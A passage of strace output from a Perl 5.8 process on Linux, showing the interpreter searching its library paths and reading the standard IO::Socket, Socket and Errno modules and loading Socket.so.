$pid;\n\n    $me;\n}\n\npackage IO::Pipe::End;\n\nour(@ISA);\n\n@ISA = qw(IO::Handle);\n\nsub close {\n    my $fh = shift;\n    my $r = $fh->SUPER::close(@_);\n\n    waitpid(${*$fh}{\'io_pipe_pid\'},0)\n\tif(defined ${*$fh}{\'io_pipe_pid\'});\n\n    $r;\n}\n\n1;\n\n__END__\n\n", 4096) = 3426
5352  07:08:43.623486 _llseek(10, 3425, [3425], SEEK_SET) = 0
5352  07:08:43.623504 _llseek(10, 0, [3425], SEEK_CUR) = 0
5352  07:08:43.623514 close(10)         = 0
5352  07:08:43.623591 stat64("/etc/perl/IO/Socket.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623628 stat64("/etc/perl/IO/Socket.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623642 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623656 stat64("/usr/local/lib/perl/5.8.8/IO/Socket.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623670 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623697 stat64("/usr/local/share/perl/5.8.8/IO/Socket.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623711 stat64("/usr/lib/perl5/IO/Socket.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623723 stat64("/usr/lib/perl5/IO/Socket.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623736 stat64("/usr/share/perl5/IO/Socket.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623748 stat64("/usr/share/perl5/IO/Socket.pm", 0xbfd2f19c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623761 stat64("/usr/lib/perl/5.8/IO/Socket.pmc", 0xbfd2f28c) = -1 ENOENT (No such file or directory)
5352  07:08:43.623773 stat64("/usr/lib/perl/5.8/IO/Socket.pm", {st_mode=S_IFREG|0644, st_size=6699, ...}) = 0
5352  07:08:43.623794 open("/usr/lib/perl/5.8/IO/Socket.pm", O_RDONLY|O_LARGEFILE) = 10
5352  07:08:43.623808 ioctl(10, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2efa8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.623820 _llseek(10, 0, [0], SEEK_CUR) = 0
5352  07:08:43.623838 read(10, "# IO::Socket.pm\n#\n# Copyright (c) 1997-8 Graham Barr <gbarr@pobox.com>. All rights reserved.\n# This program is free software; you can redistribute it and/or\n# modify it under the same terms as Perl itself.\n\npackage IO::Socket;\n\nrequire 5.006;\n\nuse IO::Handle;\nuse Socket 1.3;\nuse Carp;\nuse strict;\nour(@ISA, $VERSION, @EXPORT_OK);\nuse Exporter;\nuse Errno;\n\n# legacy\n\nrequire IO::Socket::INET;\nrequire IO::Socket::UNIX if ($^O ne \'epoc\' && $^O ne \'symbian\');\n\n@ISA = qw(IO::Handle);\n\n$VERSION = \"1.29\";\n\n@EXPORT_OK = qw(sockatmark);\n\nsub import {\n    my $pkg = shift;\n    if (@_ && $_[0] eq \'sockatmark\') { # not very extensible but for now, fast\n\tExporter::export_to_level(\'IO::Socket\', 1, $pkg, \'sockatmark\');\n    } else {\n\tmy $callpkg = caller;\n\tExporter::export \'Socket\', $callpkg, @_;\n    }\n}\n\nsub new {\n    my($class,%arg) = @_;\n    my $sock = $class->SUPER::new();\n\n    $sock->autoflush(1);\n\n    ${*$sock}{\'io_socket_timeout\'} = delete $arg{Timeout};\n\n    return scalar(%arg) ? $sock->configure(\\%arg)\n\t\t\t: $sock;\n}\n\nmy @domain2pkg;\n\nsub register_domain {\n    my($p,$d) = @_;\n    $domain2pkg[$d] = $p;\n}\n\nsub configure {\n    my($sock,$arg) = @_;\n    my $domain = delete $arg->{Domain};\n\n    croak \'IO::Socket: Cannot configure a generic socket\'\n\tunless defined $domain;\n\n    croak \"IO::Socket: Unsupported socket domain\"\n\tunless defined $domain2pkg[$domain];\n\n    croak \"IO::Socket: Cannot configure socket in domain \'$domain\'\"\n\tunless ref($sock) eq \"IO::Socket\";\n\n    bless($sock, $domain2pkg[$domain]);\n    $sock->configure($arg);\n}\n\nsub socket {\n    @_ == 4 or croak \'usage: $sock->socket(DOMAIN, TYPE, PROTOCOL)\';\n    my($sock,$domain,$type,$protocol) = @_;\n\n    socket($sock,$domain,$type,$protocol) or\n    \treturn undef;\n\n    ${*$sock}{\'io_socket_domain\'} = $domain;\n    ${*$sock}{\'io_socket_type\'}   = $type;\n    ${*$sock}{\'io_socket_proto\'}  = $protocol;\n\n    $sock;\n}\n\nsub socketpair {\n    @_ == 4 || croak \'usage: IO::Socket->socketpair(DOMAIN, TYPE, PROTOCOL)\';\n    my($class,$domain,$type,$protocol) = @_;\n    my $sock1 = $class->new();\n    my $sock2 = $class->new();\n\n    socketpair($sock1,$sock2,$domain,$type,$protocol) or\n    \treturn ();\n\n    ${*$sock1}{\'io_socket_type\'}  = ${*$sock2}{\'io_socket_type\'}  = $type;\n    ${*$sock1}{\'io_socket_proto\'} = ${*$sock2}{\'io_socket_proto\'} = $protocol;\n\n    ($sock1,$sock2);\n}\n\nsub connect {\n    @_ == 2 or croak \'usage: $sock->connect(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $err;\n    my $blocking;\n\n    $blocking = $sock->blocking(0) if $timeout;\n    if (!connect($sock, $addr)) {\n\tif (defined $timeout && $!{EINPROGRESS}) {\n\t    require IO::Select;\n\n\t    my $sel = new IO::Select $sock;\n\n\t    if (!$sel->can_write($timeout)) {\n\t\t$err = $! || (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t\t$@ = \"connect: timeout\";\n\t    }\n\t    elsif (!connect($sock,$addr) && not $!{EISCONN}) {\n\t\t# Some systems refuse to re-connect() to\n\t\t# an already open socket and set errno to EISCONN.\n\t\t$err = $!;\n\t\t$@ = \"connect: $!\";\n\t    }\n\t}\n        elsif ($blocking || !$!{EINPROGRESS})  {\n\t    $err = $!;\n\t    $@ = \"connect: $!\";\n\t}\n    }\n\n    $sock->blocking(1) if $blocking;\n\n    $! = $err if $err;\n\n    $err ? undef : $sock;\n}\n\nsub bind {\n    @_ == 2 or croak \'usage: $sock->bind(NAME)\';\n    my $sock = shift;\n    my $addr = shift;\n\n    return bind($sock, $addr) ? $sock\n\t\t\t      : undef;\n}\n\nsub listen {\n    @_ >= 1 && @_ <= 2 or croak \'usage: $sock->listen([QUEUE])\';\n    my($sock,$queue) = @_;\n    $queue = 5\n\tunless $queue && $queue > 0;\n\n    return listen($sock, $queue) ? $sock\n\t\t\t\t : undef;\n}\n\nsub accept {\n    @_ == 1 || @_ == 2 or croak \'usage $sock->accept([PKG])\';\n    my $sock = shift;\n    my $pkg = shift || $sock;\n    my $timeout = ${*$sock}{\'io_socket_timeout\'};\n    my $new = $pkg->new(Timeout => $timeout);\n    my $peer = undef;\n\n    if(defined $timeout) {\n\trequire IO::Select;\n\n\tmy $sel = new IO::Select $sock;\n\n\tunless ($sel->can_read($timeout)) {\n\t    $@ = \'accept: timeout\';\n\t    $! = (exists &Errno::ETIMEDOUT ? &Errno::ETIMEDOUT : 1);\n\t    return;\n\t}\n", 4096) = 4096
5352  07:08:43.624206 stat64("/etc/perl/Socket.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.624223 stat64("/etc/perl/Socket.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.624236 stat64("/usr/local/lib/perl/5.8.8/Socket.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.624248 stat64("/usr/local/lib/perl/5.8.8/Socket.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.624262 stat64("/usr/local/share/perl/5.8.8/Socket.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.624274 stat64("/usr/local/share/perl/5.8.8/Socket.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.624288 stat64("/usr/lib/perl5/Socket.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.624299 stat64("/usr/lib/perl5/Socket.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.624312 stat64("/usr/share/perl5/Socket.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.624324 stat64("/usr/share/perl5/Socket.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.624337 stat64("/usr/lib/perl/5.8/Socket.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.624349 stat64("/usr/lib/perl/5.8/Socket.pm", {st_mode=S_IFREG|0644, st_size=3514, ...}) = 0
5352  07:08:43.624369 open("/usr/lib/perl/5.8/Socket.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.624383 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.624394 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.624411 read(11, "package Socket;\n\nour($VERSION, @ISA, @EXPORT, @EXPORT_OK, %EXPORT_TAGS);\n$VERSION = \"1.78\";\n\nuse Carp;\nuse warnings::register;\n\nrequire Exporter;\nuse XSLoader ();\n@ISA = qw(Exporter);\n@EXPORT = qw(\n\tinet_aton inet_ntoa\n\tsockaddr_family\n\tpack_sockaddr_in unpack_sockaddr_in\n\tpack_sockaddr_un unpack_sockaddr_un\n\tsockaddr_in sockaddr_un\n\tINADDR_ANY INADDR_BROADCAST INADDR_LOOPBACK INADDR_NONE\n\tAF_802\n\tAF_AAL\n\tAF_APPLETALK\n\tAF_CCITT\n\tAF_CHAOS\n\tAF_CTF\n\tAF_DATAKIT\n\tAF_DECnet\n\tAF_DLI\n\tAF_ECMA\n\tAF_GOSIP\n\tAF_HYLINK\n\tAF_IMPLINK\n\tAF_INET\n\tAF_INET6\n\tAF_ISO\n\tAF_KEY\n\tAF_LAST\n\tAF_LAT\n\tAF_LINK\n\tAF_MAX\n\tAF_NBS\n\tAF_NIT\n\tAF_NS\n\tAF_OSI\n\tAF_OSINET\n\tAF_PUP\n\tAF_ROUTE\n\tAF_SNA\n\tAF_UNIX\n\tAF_UNSPEC\n\tAF_USER\n\tAF_WAN\n\tAF_X25\n\tIOV_MAX\n\tMSG_BCAST\n\tMSG_BTAG\n\tMSG_CTLFLAGS\n\tMSG_CTLIGNORE\n\tMSG_CTRUNC\n\tMSG_DONTROUTE\n\tMSG_DONTWAIT\n\tMSG_EOF\n\tMSG_EOR\n\tMSG_ERRQUEUE\n\tMSG_ETAG\n\tMSG_FIN\n\tMSG_MAXIOVLEN\n\tMSG_MCAST\n\tMSG_NOSIGNAL\n\tMSG_OOB\n\tMSG_PEEK\n\tMSG_PROXY\n\tMSG_RST\n\tMSG_SYN\n\tMSG_TRUNC\n\tMSG_URG\n\tMSG_WAITALL\n\tMSG_WIRE\n\tPF_802\n\tPF_AAL\n\tPF_APPLETALK\n\tPF_CCITT\n\tPF_CHAOS\n\tPF_CTF\n\tPF_DATAKIT\n\tPF_DECnet\n\tPF_DLI\n\tPF_ECMA\n\tPF_GOSIP\n\tPF_HYLINK\n\tPF_IMPLINK\n\tPF_INET\n\tPF_INET6\n\tPF_ISO\n\tPF_KEY\n\tPF_LAST\n\tPF_LAT\n\tPF_LINK\n\tPF_MAX\n\tPF_NBS\n\tPF_NIT\n\tPF_NS\n\tPF_OSI\n\tPF_OSINET\n\tPF_PUP\n\tPF_ROUTE\n\tPF_SNA\n\tPF_UNIX\n\tPF_UNSPEC\n\tPF_USER\n\tPF_WAN\n\tPF_X25\n\tSCM_CONNECT\n\tSCM_CREDENTIALS\n\tSCM_CREDS\n\tSCM_RIGHTS\n\tSCM_TIMESTAMP\n\tSHUT_RD\n\tSHUT_RDWR\n\tSHUT_WR\n\tSOCK_DGRAM\n\tSOCK_RAW\n\tSOCK_RDM\n\tSOCK_SEQPACKET\n\tSOCK_STREAM\n\tSOL_SOCKET\n\tSOMAXCONN\n\tSO_ACCEPTCONN\n\tSO_ATTACH_FILTER\n\tSO_BACKLOG\n\tSO_BROADCAST\n\tSO_CHAMELEON\n\tSO_DEBUG\n\tSO_DETACH_FILTER\n\tSO_DGRAM_ERRIND\n\tSO_DONTLINGER\n\tSO_DONTROUTE\n\tSO_ERROR\n\tSO_FAMILY\n\tSO_KEEPALIVE\n\tSO_LINGER\n\tSO_OOBINLINE\n\tSO_PASSCRED\n\tSO_PASSIFNAME\n\tSO_PEERCRED\n\tSO_PROTOCOL\n\tSO_PROTOTYPE\n\tSO_RCVBUF\n\tSO_RCVLOWAT\n\tSO_RCVTIMEO\n\tSO_REUSEADDR\n\tSO_REUSEPORT\n\tSO_SECURITY_AUTHENTICATION\n\tSO_SECURITY_ENCRYPTION_NETWORK\n\tSO_SECURITY_ENCRYPTION_TRANSPORT\n\tSO_SNDBUF\n\tSO_SNDLOWAT\n\tSO_SNDTIMEO\n\tSO_STATE\n\tSO_TYPE\n\tSO_USELOOPBACK\n\tSO_XOPEN\n\tSO_XSE\n\tUIO_MAXIOV\n);\n\n@EXPORT_OK = qw(CR LF CRLF $CR $LF $CRLF\n\n\t       IPPROTO_TCP\n\t       TCP_KEEPALIVE\n\t       TCP_MAXRT\n\t       TCP_MAXSEG\n\t       TCP_NODELAY\n\t       TCP_STDURG);\n\n%EXPORT_TAGS = (\n    crlf    => [qw(CR LF CRLF $CR $LF $CRLF)],\n    all     => [@EXPORT, @EXPORT_OK],\n);\n\nBEGIN {\n    sub CR   () {\"\\015\"}\n    sub LF   () {\"\\012\"}\n    sub CRLF () {\"\\015\\012\"}\n}\n\n*CR   = \\CR();\n*LF   = \\LF();\n*CRLF = \\CRLF();\n\nsub sockaddr_in {\n    if (@_ == 6 && !wantarray) { # perl5.001m compat; use this && die\n\tmy($af, $port, @quad) = @_;\n\twarnings::warn \"6-ARG sockaddr_in call is deprecated\" \n\t    if warnings::enabled();\n\tpack_sockaddr_in($port, inet_aton(join(\'.\', @quad)));\n    } elsif (wantarray) {\n\tcroak \"usage:   (port,iaddr) = sockaddr_in(sin_sv)\" unless @_ == 1;\n        unpack_sockaddr_in(@_);\n    } else {\n\tcroak \"usage:   sin_sv = sockaddr_in(port,iaddr))\" unless @_ == 2;\n        pack_sockaddr_in(@_);\n    }\n}\n\nsub sockaddr_un {\n    if (wantarray) {\n\tcroak \"usage:   (filename) = sockaddr_un(sun_sv)\" unless @_ == 1;\n        unpack_sockaddr_un(@_);\n    } else {\n\tcroak \"usage:   sun_sv = sockaddr_un(filename)\" unless @_ == 1;\n        pack_sockaddr_un(@_);\n    }\n}\n\nsub AUTOLOAD {\n    my($constname);\n    ($constname = $AUTOLOAD) =~ s/.*:://;\n    croak \"&Socket::constant not defined\" if $constname eq \'constant\';\n    my ($error, $val) = constant($constname);\n    if ($error) {\n\tcroak $error;\n    }\n    *$AUTOLOAD = sub { $val };\n    goto &$AUTOLOAD;\n}\n\nXSLoader::load \'Socket\', $VERSION;\n\n1;\n", 4096) = 3514
5352  07:08:43.624867 brk(0x8239000)    = 0x8239000
5352  07:08:43.625125 read(11, "", 4096) = 0
5352  07:08:43.625140 close(11)         = 0
5352  07:08:43.625227 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.so", {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5352  07:08:43.625252 stat64("/usr/lib/perl/5.8/auto/Socket/Socket.bs", {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
5352  07:08:43.625279 open("/usr/lib/perl/5.8/auto/Socket/Socket.so", O_RDONLY) = 11
5352  07:08:43.632473 read(11, "\177ELF\1\1\1\0\0\0\0\0\0\0\0\0\3\0\3\0\1\0\0\0\360\16\0\0004\0\0\0\34I\0\0\0\0\0\0004\0 \0\4\0(\0\30\0\27\0\1\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\264F\0\0\264F\0\0\5\0\0\0\0\20\0\0\1\0\0\0\264F\0\0\264V\0\0\264V\0\0\274\1\0\0\300\1\0\0\6\0\0\0\0\20\0\0\2\0\0\0\310F\0\0\310V\0\0\310V\0\0\310\0\0\0\310\0\0\0\6\0\0\0\4\0\0\0Q\345td\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\6\0\0\0\4\0\0\0%\0\0\0008\0\0\0\0\0\0\0\10\0\0\0\22\0\0\0\35\0\0\0\0\0\0\0)\0\0\0\0\0\0\0\0\0\0\0\7\0\0\0\37\0\0\0\0\0\0\0\0\0\0\0007\0\0\0$\0\0\0-\0\0\0(\0\0\0\36\0\0\0\n\0\0\0,\0\0\0001\0\0\0 \0\0\0\0\0\0\0000\0\0\0\0\0\0\0005\0\0\0!\0\0\0\0\0\0\0\30\0\0\0002\0\0\0\27\0\0\0\'\0\0\0+\0\0\0\f\0\0\0\0\0\0\0.\0\0\0/\0\0\0&\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0*\0\0\0\0\0\0\0\t\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\4\0\0\0\17\0\0\0\0\0\0\0\6\0\0\0\20\0\0\0\0\0\0\0\21\0\0\0\24\0\0\0\26\0\0\0\0\0\0\0\23\0\0\0\0\0\0\0\25\0\0\0\0\0\0\0\0\0\0\0\r\0\0\0\0\0\0\0\31\0\0\0003\0\0\0\0\0\0\0\34\0\0\0\0\0\0\0\0\0\0\0%\0\0\0#\0\0\0\5\0\0\0004\0\0\0\0\0\0\0\33\0\0\0", 512) = 512
5352  07:08:43.632473 fstat64(11, {st_mode=S_IFREG|0644, st_size=19676, ...}) = 0
5352  07:08:43.632473 mmap2(NULL, 22644, PROT_READ|PROT_EXEC, MAP_PRIVATE|MAP_DENYWRITE, 11, 0) = 0xb7d8c000
5352  07:08:43.632473 mmap2(0xb7d91000, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_DENYWRITE, 11, 0x4) = 0xb7d91000
5352  07:08:43.632474 close(11)         = 0
5352  07:08:43.633052 brk(0x825a000)    = 0x825a000
5352  07:08:43.633284 stat64("/etc/perl/Errno.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.633317 stat64("/etc/perl/Errno.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.633331 stat64("/usr/local/lib/perl/5.8.8/Errno.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.633344 stat64("/usr/local/lib/perl/5.8.8/Errno.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.633358 stat64("/usr/local/share/perl/5.8.8/Errno.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.633370 stat64("/usr/local/share/perl/5.8.8/Errno.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.633384 stat64("/usr/lib/perl5/Errno.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.633396 stat64("/usr/lib/perl5/Errno.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.633409 stat64("/usr/share/perl5/Errno.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.633420 stat64("/usr/share/perl5/Errno.pm", 0xbfd2ecec) = -1 ENOENT (No such file or directory)
5352  07:08:43.633433 stat64("/usr/lib/perl/5.8/Errno.pmc", 0xbfd2eddc) = -1 ENOENT (No such file or directory)
5352  07:08:43.633445 stat64("/usr/lib/perl/5.8/Errno.pm", {st_mode=S_IFREG|0644, st_size=5967, ...}) = 0
5352  07:08:43.633467 open("/usr/lib/perl/5.8/Errno.pm", O_RDONLY|O_LARGEFILE) = 11
5352  07:08:43.633482 ioctl(11, SNDCTL_TMR_TIMEBASE or TCGETS, 0xbfd2eaf8) = -1 ENOTTY (Inappropriate ioctl for device)
5352  07:08:43.633495 _llseek(11, 0, [0], SEEK_CUR) = 0
5352  07:08:43.633518 read(11, "#\n# This file is auto-generated. ***ANY*** changes here will be lost\n#\n\npackage Errno;\nour (@EXPORT_OK,%EXPORT_TAGS,@ISA,$VERSION,%errno,$AUTOLOAD);\nuse Exporter ();\nuse strict;\n\n$VERSION = \"1.09_01\";\n$VERSION = eval $VERSION;\n@ISA = qw(Exporter);\n\n@EXPORT_OK = qw(EBADR ENOMSG ENOTSUP ESTRPIPE EADDRINUSE EL3HLT EBADF\n\tENOTBLK ENAVAIL ECHRNG ENOTNAM ELNRNG ENOKEY EXDEV EBADE EBADSLT\n\tECONNREFUSED ENOSTR ENONET EOVERFLOW EISCONN EFBIG EKEYREVOKED\n\tECONNRESET EWOULDBLOCK ELIBMAX EREMOTEIO ENOPKG ELIBSCN EDESTADDRREQ\n\tENOTSOCK EIO EMEDIUMTYPE EINPROGRESS ERANGE EAFNOSUPPORT EADDRNOTAVAIL\n\tEINTR EREMOTE EILSEQ ENOMEM EPIPE ENETUNREACH ENODATA EUSERS\n\tEOPNOTSUPP EPROTO EISNAM ESPIPE EALREADY ENAMETOOLONG ENOEXEC EISDIR\n\tEBADRQC EEXIST EDOTDOT ELIBBAD EOWNERDEAD ESRCH EFAULT EXFULL\n\tEDEADLOCK EAGAIN ENOPROTOOPT ENETDOWN EPROTOTYPE EL2NSYNC ENETRESET\n\tEUCLEAN EADV EROFS ESHUTDOWN EMULTIHOP EPROTONOSUPPORT ENFILE ENOLCK\n\tECONNABORTED ECANCELED EDEADLK ESRMNT ENOLINK ETIME ENOTDIR EINVAL\n\tENOTTY ENOANO ELOOP ENOENT EPFNOSUPPORT EBADMSG ENOMEDIUM EL2HLT EDOM\n\tEBFONT EKEYEXPIRED EMSGSIZE ENOCSI EL3RST ENOSPC EIDRM ENOBUFS ENOSYS\n\tEHOSTDOWN EBADFD ENOSR ENOTCONN ESTALE EDQUOT EKEYREJECTED EMFILE\n\tENOTRECOVERABLE EACCES EBUSY E2BIG EPERM ELIBEXEC ETOOMANYREFS ELIBACC\n\tENOTUNIQ ECOMM ERESTART ESOCKTNOSUPPORT EUNATCH ETIMEDOUT ENXIO ENODEV\n\tETXTBSY EMLINK ECHILD EHOSTUNREACH EREMCHG ENOTEMPTY);\n\t\n%EXPORT_TAGS = (\n    POSIX => [qw(\n\tE2BIG EACCES EADDRINUSE EADDRNOTAVAIL EAFNOSUPPORT EAGAIN EALREADY\n\tEBADF EBUSY ECHILD ECONNABORTED ECONNREFUSED ECONNRESET EDEADLK\n\tEDESTADDRREQ EDOM EDQUOT EEXIST EFAULT EFBIG EHOSTDOWN EHOSTUNREACH\n\tEINPROGRESS EINTR EINVAL EIO EISCONN EISDIR ELOOP EMFILE EMLINK\n\tEMSGSIZE ENAMETOOLONG ENETDOWN ENETRESET ENETUNREACH ENFILE ENOBUFS\n\tENODEV ENOENT ENOEXEC ENOLCK ENOMEM ENOPROTOOPT ENOSPC ENOSYS ENOTBLK\n\tENOTCONN ENOTDIR ENOTEMPTY ENOTSOCK ENOTTY ENXIO EOPNOTSUPP EPERM\n\tEPFNOSUPPORT EPIPE EPROTONOSUPPORT EPROTOTYPE ERANGE EREMOTE ERESTART\n\tEROFS ESHUTDOWN ESOCKTNOSUPPORT ESPIPE ESRCH ESTALE ETIMEDOUT\n\tETOOMANYREFS ETXTBSY EUSERS EWOULDBLOCK EXDEV\n    )]\n);\n\nsub EPERM () { 1 }\nsub ENOENT () { 2 }\nsub ESRCH () { 3 }\nsub EINTR () { 4 }\nsub EIO () { 5 }\nsub ENXIO () { 6 }\nsub E2BIG () { 7 }\nsub ENOEXEC () { 8 }\nsub EBADF () { 9 }\nsub ECHILD () { 10 }\nsub EWOULDBLOCK () { 11 }\nsub EAGAIN () { 11 }\nsub ENOMEM () { 12 }\nsub EACCES () { 13 }\nsub EFAULT () { 14 }\nsub ENOTBLK () { 15 }\nsub EBUSY () { 16 }\nsub EEXIST () { 17 }\nsub EXDEV () { 18 }\nsub ENODEV () { 19 }\nsub ENOTDIR () { 20 }\nsub EISDIR () { 21 }\nsub EINVAL () { 22 }\nsub ENFILE () { 23 }\nsub EMFILE () { 24 }\nsub ENOTTY () { 25 }\nsub ETXTBSY () { 26 }\nsub EFBIG () { 27 }\nsub ENOSPC () { 28 }\nsub ESPIPE () { 29 }\nsub EROFS () { 30 }\nsub EMLINK () { 31 }\nsub EPIPE () { 32 }\nsub EDOM () { 33 }\nsub ERANGE () { 34 }\nsub EDEADLOCK () { 35 }\nsub EDEADLK () { 35 }\nsub ENAMETOOLONG () { 36 }\nsub ENOLCK () { 37 }\nsub ENOSYS () { 38 }\nsub ENOTEMPTY () { 39 }\nsub ELOOP () { 40 }\nsub ENOMSG () { 42 }\nsub EIDRM () { 43 }\nsub ECHRNG () { 44 }\nsub EL2NSYNC () { 45 }\nsub EL3HLT () { 46 }\nsub EL3RST () { 47 }\nsub ELNRNG () { 48 }\nsub EUNATCH () { 49 }\nsub ENOCSI () { 50 }\nsub EL2HLT () { 51 }\nsub EBADE () { 52 }\nsub EBADR () { 53 }\nsub EXFULL () { 54 }\nsub ENOANO () { 55 }\nsub EBADRQC () { 56 }\nsub EBADSLT () { 57 }\nsub EBFONT () { 59 }\nsub ENOSTR () { 60 }\nsub ENODATA () { 61 }\nsub ETIME () { 62 }\nsub ENOSR () { 63 }\nsub ENONET () { 64 }\nsub ENOPKG () { 65 }\nsub EREMOTE () { 66 }\nsub ENOLINK () { 67 }\nsub EADV () { 68 }\nsub ESRMNT () { 69 }\nsub ECOMM () { 70 }\nsub EPROTO () { 71 }\nsub EMULTIHOP () { 72 }\nsub EDOTDOT () { 73 }\nsub EBADMSG () { 74 }\nsub EOVERFLOW () { 75 }\nsub ENOTUNIQ () { 76 }\nsub EBADFD () { 77 }\nsub EREMCHG () { 78 }\nsub ELIBACC () { 79 }\nsub ELIBBAD () { 80 }\nsub ELIBSCN () { 81 }\nsub ELIBMAX () { 82 }\nsub ELIBEXEC () { 83 }\nsub EILSEQ () { 84 }\nsub ERESTART () { 85 }\nsub ESTRPIPE () { 86 }\nsub EUSERS () { 87 }\nsub ENOTSOCK () { 88 }\nsub EDESTADDRREQ () { 89 }\nsub EMSGSIZE () { 90 }\nsub EPROTOTYPE () { 91 }\nsub ENOPROTOOPT () { 92 }\nsub EPROTONOSUPPORT () ", 4096) = 4096
5352  07:08:43.634482 read(11, "{ 93 }\nsub ESOCKTNOSUPPORT () { 94 }\nsub ENOTSUP () { 95 }\nsub EOPNOTSUPP () { 95 }\nsub EPFNOSUPPORT () { 96 }\nsub EAFNOSUPPORT () { 97 }\nsub EADDRINUSE () { 98 }\nsub EADDRNOTAVAIL () { 99 }\nsub ENETDOWN () { 100 }\nsub ENETUNREACH () { 101 }\nsub ENETRESET () { 102 }\nsub ECONNABORTED () { 103 }\nsub ECONNRESET () { 104 }\nsub ENOBUFS () { 105 }\nsub EISCONN () { 106 }\nsub ENOTCONN () { 107 }\nsub ESHUTDOWN () { 108 }\nsub ETOOMANYREFS () { 109 }\nsub ETIMEDOUT () { 110 }\nsub ECONNREFUSED () { 111 }\nsub EHOSTDOWN () { 112 }\nsub EHOSTUNREACH () { 113 }\nsub EALREADY () { 114 }\nsub EINPROGRESS () { 115 }\nsub ESTALE () { 116 }\nsub EUCLEAN () { 117 }\nsub ENOTNAM () { 118 }\nsub ENAVAIL () { 119 }\nsub EISNAM () { 120 }\nsub EREMOTEIO () { 121 }\nsub EDQUOT () { 122 }\nsub ENOMEDIUM () { 123 }\nsub EMEDIUMTYPE () { 124 }\nsub ECANCELED () { 125 }\nsub ENOKEY () { 126 }\nsub EKEYEXPIRED () { 127 }\nsub EKEYREVOKED () { 128 }\nsub EKEYREJECTED () { 129 }\nsub EOWNERDEAD () { 130 }\nsub ENOTRECOVERABLE () { 131 }\n\nsub TIEHASH { bless [] }\n\nsub FETCH {\n    my ($self, $errname) = @_;\n    my $proto = prototype(\"Errno::$errname\");\n    my $errno = \"\";\n    if (defined($proto) && $proto eq \"\") {\n\tno strict \'refs\';\n\t$errno = &$errname;\n        $errno = 0 unless $! == $errno;\n    }\n    return $errno;\n}\n\nsub STORE {\n    require Carp;\n    Carp::confess(\"ERRNO hash is read only!\");\n}\n\n*CLEAR = \\&STORE;\n*DELETE = \\&STORE;\n\nsub NEXTKEY {\n    my($k,$v);\n    while(($k,$v) = each %Errno::) {\n\tmy $proto = prototype(\"Errno::$k\");\n\tlast if (defined($proto) && $proto eq \"\");\n    }\n    $k\n}\n\nsub FIRSTKEY {\n    my $s = scalar keys %Errno::;\t# initialize iterator\n    goto &NEXTKEY;\n}\n\nsub EXISTS {\n    my ($self, $errname) = @_;\n    my $r = ref $errname;\n    my $proto = !$r || $r eq \'CODE\' ? prototype($errname) : undef;\n    defined($proto) && $proto eq \"\";\n}\n\ntie %!, __PACKAGE__;\n\n1;\n__END__\n\n", 4096) = 1871
5352  07:08:43.635019 _llseek(11, 5966, [5966], SEEK_SET) = 0
5352  07:08:43.635044 _llseek(11, 0, [5966], SEEK_CUR) = 0
5352  07:08:43.635054 close(11)         = 0
5352  07:08:43.635511 brk(0x827b000)    = 0x827b000
